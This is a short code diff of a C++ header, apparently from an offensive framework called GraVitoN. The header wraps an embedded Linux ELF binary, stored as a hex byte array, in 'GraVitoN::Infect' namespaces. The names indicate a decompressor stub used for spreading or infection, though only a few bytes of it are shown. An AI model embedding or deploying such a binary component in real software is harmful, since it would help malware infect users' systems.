@@ -29,6 +29,12 @@
 #ifndef _GVN_SPREAD_EOF_DECOM_LINUX64_HEAD_
 #define _GVN_SPREAD_EOF_DECOM_LINUX64_HEAD_
 
+namespace GraVitoN
+{
+
+namespace Infect
+{
+
 const unsigned long DECOM_EOF_LINUX64_SIZE = 45580;
 const unsigned char DECOM_EOF_LINUX64[] = 
 "\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"
@@ -2881,6 +2887,8 @@ const unsigned char DECOM_EOF_LINUX64[] =
 "\x75\x5f\x63\x78\x78\x31\x33\x6e\x65\x77\x5f\x61\x6c\x6c\x6f\x63"
 "\x61\x74\x6f\x72\x49\x6d\x45\x43\x31\x45\x76\x00"
 ;
-;
+
+}
+}
 
 #endif
